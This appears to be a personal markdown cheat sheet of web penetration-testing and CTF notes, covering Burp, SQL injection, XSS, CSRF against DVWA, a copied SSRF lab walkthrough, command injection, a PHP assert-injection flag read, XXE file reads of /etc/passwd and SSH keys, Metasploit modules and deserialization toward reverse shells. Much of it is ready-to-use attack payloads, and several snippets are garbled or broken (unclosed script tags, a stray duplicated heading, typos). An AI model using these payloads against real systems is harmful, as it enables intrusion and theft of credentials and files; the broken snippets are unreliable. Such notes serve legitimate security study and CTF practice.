# Cont'd vulns/learn.md

# Burp Suite
-robots.txt | sitemap.xml
Proxy on browser -> 127.0.0

target /intercetp 
confirm proxy

# Flask python debugger vul
* when error and debugger enabled
* Click right side enter console
* `import subprocess;out = subprocess.Popen(['whoami'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT);stdout,stderr = out.communicate();print(stdout);`

# Sql blind inject 
* see scripts/python

# SQL drop to shell
* mysql> \! /bin/sh

spidering

adding to scope

# 301 302 vuln
301 or 302 content? replace with 200

# wasp zap

spidering 

forced dir

# Dirbuster

# Check certs

# Shellshock

* nmap -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/script.sh|bin,cmd=ls <IP>

# DNS stuff

* when dns is on tcp it facilitaes zone transfers  (dif axfr @IP web/host)
* dig @!P web/host
* add vhost to /etc/host

# cross site scripting
```
<script> alert("script")<script>

client
<img src="" onerror="alert("ww")">
```

# Cross site scripting  Request forger
```
create login 

burp => httmp proxy ->select-> reapeter 
```
```
<script>
xmlhttp = XMLHttpRequest;
xmlhttp.open('GET', 'http://192.168.56.101/dvwa/vulnerabilities/csrf/?password_new=yyy&password_conf=yyy&Change=Change');
xmlhttp.send()
<script>
```
inject script Cookie: XSRF= isndsiuc<script>

If user is clicking links
`Host test.html`
```
<html>
  <iframe src="http://IP/dvwa/vulnerabilities/csrf/?password_new=yyy&password_conf=yyy&Change=Change"></iframe>
</html>
```

# Server side request forgery

```
trying to reach server thourgh client requests

Enter a name in the form and click the "Search" button. When the page loads, it should tell you whether that name is on the Naughty List or the Nice List. Notice that the URL for the page looks something like this: http://10.10.84.161/?proxy=http%3A%2F%2Flist.hohoho%3A8080%2Fsearch.php%3Fname%3DTib3rius

If we use a URL decoder on the value of the "proxy" parameter, we get: http://list.hohoho:8080/search.php?name=Tib3rius

Since "list.hohoho" is not a valid hostname on the Internet (.hohoho is not a top-level domain), this hostname likely refers to some back-end machine. It seems that the web app works by taking this URL, making a request at the back-end, and then returning the result to the front-end web app. If the developer has not been careful, we may be able to exploit this functionality using Server-Side Request Forgery (SSRF).

The most obvious thing we can try to do first is to fetch the root of the same site. Browse to: http://10.10.84.161/?proxy=http%3A%2F%2Flist.hohoho%3A8080%2F 

This seems to have potential, as in place of the original "Tib3rius is on the Nice List." message, we instead see "Not Found. The requested URL was not found on this server." This seems like a generic 404 message, indicating that we were able to make the server request the modified URL and return the response.

There are many things we could do now, such as trying to find valid URLs for the "list.hohoho" site. We could also try changing the port number from 8080 to something else, to see if we can connect to any other services running on the host, even if these services are not web servers.

Try changing the port number from 8080 to just 80 (the default HTTP port): http://10.10.84.161/?proxy=http%3A%2F%2Flist.hohoho%3A80

The message now changes to "Failed to connect to list.hohoho port 80: Connection refused" which suggests that port 80 is not open on list.hohoho.

Try changing the port number to 22 (the default SSH port): http://10.10.84.161/?proxy=http%3A%2F%2Flist.hohoho%3A22

The message now changes to "Recv failure: Connection reset by peer" which suggests that port 22 is open but did not understand what was sent (this makes sense, as sending an HTTP request to an SSH server will not get you anywhere!)

Enumerating open ports via SSRF can be performed in this manner, by iterating over common ports and measuring the differences between responses. Even in cases where error messages aren't returned, it is often possible to detect which ports are open vs closed by measuring the time each request takes to complete.

Another thing we can try to do with SSRF is access services running locally on the server. We can do this by replacing the list.hohoho hostname with "localhost" or "127.0.0.1" (among others). Try this now: http://10.10.84.161/?proxy=http%3A%2F%2Flocalhost

Oops! It looks like the developer has a check in place for this, as the message returned says "Your search has been blocked by our security team."

Indeed, if you try other hostnames (e.g. 127.0.0.1, example.com, etc.) they will all be blocked. The developer has implemented a check to ensure that the hostname provided starts with "list.hohoho", and will block any hostnames that don't.

As it turns out, this check can easily be bypassed. Since the hostname simply needs to start with "list.hohoho", we can take advantage of DNS subdomains and create our own domain "list.hohoho.evilsite.com" which resolves to 127.0.0.1. In fact, we don't even need to buy a domain or configure the DNS, because multiple domains already exist that let us do this. The one we will be using is localtest.me, which resolves every subdomain to 127.0.0.1.

We can therefore set the hostname in the URL to "list.hohoho.localtest.me", bypass the check, and access local services: http://10.10.84.161/?proxy=http%3A%2F%2Flist.hohoho.localtest.me

```

# cookie collection and reverse engineering

get auth cookie token

decode token jsonwebtoken.io

decript any hash 

# http attribute (cookie stealing)

# Sql Injection

` 'or 1=1 --  `

# Go buster
```
sudo gobuster dir -u 10.10.46.221:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

# tomcat vuln

* msf > use exploit/windows/http/tomcat_cgi_cmdlineargs
* msf exploit(tomcat_cgi_cmdlineargs) > show targets
    ...targets...
* msf exploit(tomcat_cgi_cmdlineargs) > set TARGET < * target-id > as the /cgi-bin/vulnscript | bat/sh
* msf exploit(tomcat_cgi_cmdlineargs) > show options
    ...show and set options...
* msf exploit(tomcat_cgi_cmdlineargs) > 

# Apache Struts 0-day

* https://github.com/LightC0der/Apache-Struts-0Day-Exploit | -> run python sxript

# Nikto

`nikto -h 10.10.46.221:80`

`nikto -h 10.10.50.194:1234/manager/html -id bob:bubbles`

# OWASP TOP 10

# 1 Injection -> Command

* try special char
```
for character in $(cat special_chars.txt); do
  echo -n "$character : " && curl -s http://challenge.nahamcon.com/?echo=$character | wc -c
done
```
```
There are several other special characters that can be used to break out of bash shells. Namely: $(id)

; id

id (As shown here)

&& id

cat file == < file  in bash
```

## Fuzz


## Code injection from SQL Injectin

* id=1000 union select '10.6.31.213'--
* -9527 UNION ALL SELECT NULL,CONCAT("|","whoami")-- - || check sqlmap payload

## Vuln php

```
<?php

if (isset($_GET['page'])) {
  $page = $_GET['page'];
  $file = $page . ".php";

  // Saving ourselves from any kind of hackings and all
  assert("strpos('$file', '..') === false") or die("HACKING DETECTED! PLEASE STOP THE HACKING PRETTY PLEASE");

} else {
  $file = "home.php";
}

include($file);

?>
```

```
/index.php?page=', '..') === false and $myfile = fopen("/flag.txt", "r") and exit(fread($myfile,filesize("/flag.txt"))) or true or strpos('
```
## translates to

```
assert("strpos('', '..') === false and $myfile = fopen("/flag.txt", "r") and exit(fread($myfile,filesize("/flag.txt"))) or true or strpos('', '..') === false") or die("HACKING DETECTED! PLEASE STOP THE HACKING PRETTY PLEASE");
```

## Php filter2base64

`php://filter/convert.base64-encode/resource=index`

## Flask console debug vuln

`__import__('os').popen('cat static/flag.txt').read();`

# 2 Broken Auth Register same user with " " vuln
`register an already made username like admin`
# 3 Sensitive data exposure 
`Navigating directories`
```
Snooping Databases
download db file 
sqlite 3 <db>
Usage 
    .tables
    PRAGMA table_info(table);
    SELECT * FROM table
Crack -> Crackstation.net
```


# 4 XML Entity
```
An XML External Entity (XXE) attack is a vulnerability that abuses features of XML parsers/data. It often allows an attacker to interact with any backend or external systems that the application itself can access and can allow the attacker to read the file on that system. They can also cause Denial of Service (DoS) attack or could use XXE to perform Server-Side Request Forgery (SSRF) inducing the web application to make requests to other applications. XXE may even enable port scanning and lead to remote code execution.
```
```
There are two types of XXE attacks: in-band and out-of-band (OOB-XXE).
1) An in-band XXE attack is the one in which the attacker can receive an immediate response to the XXE payload.

2) out-of-band XXE attacks (also called blind XXE), there is no immediate response from the web application and attacker has to reflect the output of their XXE payload to some other file or their own server.
```
`prolog`
`<?xml version="1.0" encoding="UTF-8"?>` 
```
<?xml version="1.0" encoding="UTF-8"?>
<mail>
   <to>falcon</to>
   <from>feast</from>
   <subject>About XXE</subject>
   <text>Teach about XXE</text>
</mail>
```
```
DTD stands for Document Type Definition. A DTD defines the structure and the legal elements and attributes of an XML docum
```
```
Let us try to understand this with the help of an example. Say we have a file named note.dtd with the following content:

<!DOCTYPE note [ <!ELEMENT note (to,from,heading,body)> <!ELEMENT to (#PCDATA)> <!ELEMENT from (#PCDATA)> <!ELEMENT heading (#PCDATA)> <!ELEMENT body (#PCDATA)> ]>
```
`<!DOCTYPE note SYSTEM "note.dtd">`



Now we'll see some XXE payload and see how they are working.

1) The first payload we'll see is very simple. If you've read the previous task properly then you'll understand this payload very easily.
```
<!DOCTYPE replace [<!ENTITY name "feast"> ]>
 <userInfo>
  <firstName>falcon</firstName>
  <lastName>&name;</lastName>
 </userInfo>

```
As we can see we are defining a ENTITY called name and assigning it a value feast. Later we are using that ENTITY in our code.

2) We can also use XXE to read some file from the system by defining an ENTITY and having it use the SYSTEM keyword
```
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
```
Here again, we are defining an ENTITY with the name read but the difference is that we are setting it value to `SYSTEM` and path of the file.

If we use this payload then a website vulnerable to XXE(normally) would display the content of the file /etc/passwd.

In a similar manner, we can use this kind of payload to read other files but a lot of times you can fail to read files in this manner or the reason for failure could be the file you are trying to read.
 

Try to get ///home/user/.ssh/id_rsa and crack or use it like that

# 5 Broken access contorol (IDOR, or Insecure Direct Object Reference)

` Basically abusing the GET -> ?para=1&`

# 6 sECURITy Misconfig
` Source code and research templates default passwords`

# 7 Cross-site scriptingx

`http://www.xss-payloads.com`

`document.cookie`
`window.location.hostname`
`<script>document.querySelector('#thm-title').textContent = 'I am a hacker'</script>`
` search for params sent in request in response`

# Insecure Deserialize<script>document.querySelector('#thm-title').textContent = 'I am a hacker'</script>

# 8 Insecure Deserialization
` cookie decode`
` base 64`
` Reverse shell by encoding bas64 payload with python rce.py`
`https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a`
## php 
SEE `ctf/uscyberopen/source`

use  `sudo php -S 127.0.0.1:80` to start test server

## Attack.php
```
<?php
class User{
  public function __construct(){
    $this->username = 'test';
    $this->isAdmin = 'test';
  }
}

$obj = new User();
echo serialize($obj);
?>
```
* find the function that has (file read, write to file(rce) etc)
* create an object that links the function (use the variable that "echos")
## node.js
SEE `ctf/zh3r0v2-ctf/public`

# 9 Components with known vulnerabil

`research for remote code vuln`

# 10 Insufficient Logging -> Self explanat



# Traverse url

```
for i in {1..500}

  do 

     curl "https://bot-not-not-bot.vishwactf.com/page"$i".html"  >>  filereqq

 done

```

# Header 

* X-Forwarded-For: 127.0.0.1
* Accept: application/json

# Flask 

# LFI SUITE

* https://github.com/D35m0nd142/LFISuite